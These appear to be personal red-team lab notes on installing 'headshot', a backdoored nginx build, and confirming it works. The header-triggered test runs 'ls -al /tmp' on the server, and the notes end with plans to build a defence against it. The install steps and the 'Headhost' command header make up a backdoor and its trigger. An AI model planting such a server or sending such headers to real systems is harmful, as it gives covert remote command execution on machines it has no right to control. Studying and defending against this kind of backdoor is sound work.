Finally talked with Nick and fixed(?) headshot. 

https://github.com/ritredteam/headshot


git clone https://github.com/ritredteam/headshot
apt-get purge nginx nginx-common nginx-full

cd ./headshot 
./install.sh 

# It's at /usr/local/nginx because it was installed manually, not through package manager 
cd ./usr/local/nginx/sbin
./nginx -v  # Check out that it is nginx/1.15.0

./nginx 
netstat -tulpn | grep nginx

curl localhost --header "Headhost: ls -al /tmp"
# Find out that headshot works 

# Now try to find a way to defend against headshot, or, to safely re-install nginx. 
# Get a clean distro snapshot, install nginx, make some changes, backup files, reinstall nginx. 
# See if everything works correctly.
